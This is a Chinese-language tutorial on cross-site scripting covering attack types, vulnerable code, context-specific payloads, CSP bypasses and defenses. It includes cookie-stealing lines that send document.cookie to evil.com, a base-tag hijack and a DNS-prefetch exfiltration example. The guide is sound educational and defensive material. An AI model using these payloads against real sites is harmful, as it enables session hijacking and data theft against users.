XSS 跨站脚本攻击完全指南

HIGH XSS (Cross-Site Scripting) 是最常见的 Web 漏洞之一。攻击者将恶意脚本注入到受信任的网页中，在其他用户的浏览器中执行。

XSS 的本质

XSS 的本质是：攻击者的 JavaScript 代码在受害者的浏览器中，以目标网站的身份执行。由于同源策略，浏览器信任来自 example.com 的所有脚本 —— 包括被注入的恶意脚本。

1. XSS 概述

1.1 同源策略回顾

理解 XSS 的前提是理解同源策略（Same-Origin Policy）：

  • 浏览器允许同源的脚本访问该源的所有资源（Cookie、DOM、AJAX）
  • XSS 让攻击者的代码以目标网站为源运行 → 可以做目标网站能做的一切

1.2 XSS 三大类型对比

类型触发方式持久性危害程度典型场景
反射型URL中的参数被反射到页面一次性(需诱导点击)中搜索框、错误消息
存储型恶意数据存入数据库，展示时触发永久(所有访问者受影响)高评论区、用户资料
DOM型客户端JS处理不当导致取决于场景中-高前端路由、动态渲染

1.3 XSS 能做什么？

  • 窃取 Cookie/Session：document.cookie → 会话劫持
  • 键盘记录：监听 keypress 事件 → 记录密码
  • 钓鱼：修改页面 DOM 显示假登录框
  • 加密货币挖矿：利用受害者 CPU
  • 蠕虫传播：自动发布包含 XSS 的内容（Samy 蠕虫）
  • 下载恶意软件：诱导或自动下载
  • 内网探测：利用受害者浏览器扫描内网
  • 获取摄像头/麦克风权限（需要用户授权弹窗）

2. 反射型 XSS

用户输入从 URL 参数中被"反射"到响应页面中，如果未经编码直接输出，就会执行恶意脚本。

反射型 XSS 攻击流程： 1. 攻击者构造恶意URL: http://example.com/search?q=<script>document.location='http://evil.com/?c='+document.cookie</script> 2. 攻击者将URL通过钓鱼邮件/社交工程发送给受害者 3. 受害者点击链接 → 浏览器发送请求到 example.com 4. 服务器返回页面，包含: <p>搜索结果: <script>document.location='http://evil.com/?c='+document.cookie</script></p> 5. 受害者浏览器执行脚本 → Cookie 被发送到攻击者服务器 6. 攻击者获得受害者的 session cookie → 登录受害者账户

2.1 漏洞代码示例

# Python Flask - 反射型XSS
@app.route('/search')
def search():
    query = request.args.get('q', '')
    # ❌ 直接将用户输入嵌入 HTML
    return f'<h1>搜索结果: {query}</h1>'

# PHP
<?php
// ❌ 直接输出
echo "<h1>搜索: " . $_GET['q'] . "</h1>";
?>

# Node.js Express
app.get('/search', (req, res) => {
    // ❌ 直接拼接
    res.send(`<h1>Results for: ${req.query.q}</h1>`);
});

3. 存储型 XSS

恶意脚本被永久存储在目标服务器（数据库）中。每个查看该内容的用户都会被攻击。危害最大。

存储型 XSS 攻击流程： 1. 攻击者在论坛发表评论: "好文章！<script>new Image().src='http://evil.com/steal?c='+document.cookie</script>" 2. 恶意评论存入数据库 3. 其他用户浏览该帖子 4. 服务器从数据库读取评论，未编码直接输出到页面 5. 每个查看帖子的用户 → 浏览器执行恶意脚本 → Cookie 被窃取 影响范围：所有查看该页面的用户（可能数千人）

3.1 常见存储型 XSS 注入点

  • 用户昵称/签名/个人简介
  • 论坛帖子/评论
  • 私信/站内信
  • 文件名（上传文件后展示文件名）
  • 订单备注（客服后台查看时触发）
  • 反馈表单（管理员查看时触发）
  • 日志记录（安全人员查看日志时触发 → 针对管理员的攻击！）

4. DOM 型 XSS

漏洞完全在客户端 JavaScript 中。恶意数据不经过服务器，直接在浏览器 DOM 操作中被执行。

4.1 DOM XSS 原理

// ❌ 漏洞代码 - 从URL获取数据直接写入DOM
// URL: http://example.com/page#<img src=x onerror=alert(1)>

// Source (数据来源) → Sink (危险函数)
var hash = location.hash.substring(1);  // Source: location.hash
document.getElementById('output').innerHTML = hash;  // Sink: innerHTML

// 其他常见 Source:
// - document.URL
// - document.referrer
// - location.href / location.hash / location.search
// - window.name
// - postMessage 的 event.data

// 其他常见 Sink:
// - innerHTML / outerHTML
// - document.write()
// - eval()
// - setTimeout(string) / setInterval(string)
// - jQuery .html() / .append() / $()
// - element.setAttribute("onclick", userInput)

4.2 DOM XSS vs 反射型 XSS

区别反射型DOM型
恶意数据经过服务器？是（服务器返回带payload的HTML）否（纯客户端处理）
服务端能看到攻击？能（在日志中）不能（fragment#后内容不发送到服务器）
WAF能拦截？通常能不能（数据不经过服务器）
修复方式服务端输出编码前端JS安全编码

5.2 上下文相关 Payload

输入点: <div>[用户输入]</div>

<!-- 3. href/src属性 -->
输入点: <a href="[用户输入]">
Payload: javascript:alert(1)
         data:text/html,<script>alert(1)</script>

<!-- 4. JavaScript字符串内 -->
输入点: <script> var name = '[用户输入]'; </script>
Payload: '; alert(1); //
         '+alert(1)+'
         </script><script>alert(1)</script>

<!-- 5. JavaScript模板字符串 -->
输入点: <script> var x = `Hello ${[用户输入]}`; </script>
Payload: ${alert(1)}

<!-- 6. CSS上下文 -->
输入点: <div style="color: [用户输入]">
Payload: red; background: url(javascript:alert(1))  [旧浏览器]
         expression(alert(1))  [IE]

<!-- 7. 注释中 -->
输入点: <!-- [用户输入] -->
Payload: --><script>alert(1)</script><!--

8. CSP 防御与绕过

8.1 CSP 工作原理

Content-Security-Policy 如何阻止 XSS： 没有 CSP: <script>alert(1)</script> → 浏览器执行 ✓ 有 CSP: script-src 'self' <script>alert(1)</script> → 内联脚本，不在白名单 → 浏览器拒绝执行 ✗ <script src="/js/app.js"> → 同源脚本 → 执行 ✓ <script src="http://evil.com/xss.js"> → 非同源 → 拒绝 ✗ CSP 本质：白名单机制，只允许特定来源的脚本执行

8.2 CSP 绕过技术

// 绕过 script-src 'self':
// 如果同源有可控的 JS 文件（如 JSONP 端点）
<script src="/api/jsonp?callback=alert(1)//"></script>

// 绕过 script-src 'unsafe-eval':
eval("alert(1)")
setTimeout("alert(1)")
new Function("alert(1)")()

// 绕过 script-src 'nonce-xxx':
// 找到页面上已有nonce的script标签，利用DOM操作
// 或者找到 base 标签注入（如果 base-uri 没限制）
<base href="http://evil.com/">
// 然后页面上 <script src="/js/app.js"> 会从 evil.com 加载！

// 绕过 CSP 通过 DNS prefetch 外带数据
<link rel="dns-prefetch" href="//data.attacker.com">
// 即使 connect-src 限制了，DNS请求通常不受CSP限制

// 利用 CSP report-uri 收集信息
// 注入导致 CSP 违规的内容，报告中包含页面信息

9. XSS 防御（开发者指南）

9.1 核心防御：输出编码

首要原则：在正确的上下文使用正确的编码

不同的输出上下文需要不同的编码方式。一种编码不能解决所有场景。

输出上下文编码方式需要编码的字符
HTML 标签内文本HTML 实体编码& < > " '
HTML 属性值HTML 属性编码除字母数字外全部编码
JavaScript 字符串JavaScript 编码\xHH 格式
URL 参数值URL 编码%HH 格式
CSS 值CSS 编码\HHHHHH 格式

9.2 各语言/框架防御

# Python Flask - 使用 Jinja2 自动转义
# ✅ Jinja2 默认开启自动转义
{{ user_input }}  {# 自动HTML编码 #}

# ❌ 危险：标记为safe会跳过转义
{{ user_input | safe }}  {# 不要这样做！ #}

# ✅ 手动编码
from markupsafe import escape
escaped = escape(user_input)

# ──────────────────────────────────────────────

// JavaScript / Node.js
// ✅ 使用 textContent 而非 innerHTML
element.textContent = userInput;  // 安全：作为文本处理

// ❌ 危险
element.innerHTML = userInput;  // 会解析HTML！

// ✅ 使用 DOMPurify 清理 HTML（允许部分HTML时）
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userInput);

// ──────────────────────────────────────────────

// React - 默认安全
// ✅ JSX 默认转义
return <div>{userInput}</div>  // 自动编码

// ❌ 危险：dangerouslySetInnerHTML
return <div dangerouslySetInnerHTML={{__html: userInput}} />  // 不安全！

// ──────────────────────────────────────────────

// PHP
// ✅ 使用 htmlspecialchars
echo htmlspecialchars($input, ENT_QUOTES, 'UTF-8');

// ❌ 直接输出
echo $input;

9.3 防御清单

层次措施效果
输出层上下文感知的输出编码阻止XSS执行（最核心）
输入层输入验证（白名单）过滤明显恶意输入
HTTP层Content-Security-Policy即使注入成功也限制执行
Cookie层HttpOnly 标志XSS无法窃取Cookie
Cookie层SameSite 标志配合防CSRF
框架层使用现代框架(React/Vue/Angular)默认转义输出
富文本使用白名单HTML清理器(DOMPurify)只允许安全的HTML标签/属性
常见错误防御
  • 黑名单过滤：过滤 <script> → 用 <img onerror> 绕过
  • 只做输入验证不做输出编码：数据可能从其他入口进入
  • 全局替换 < 和 >：在 JS 上下文中无效
  • 依赖 WAF：WAF 总能被绕过，应作为补充而非唯一防御
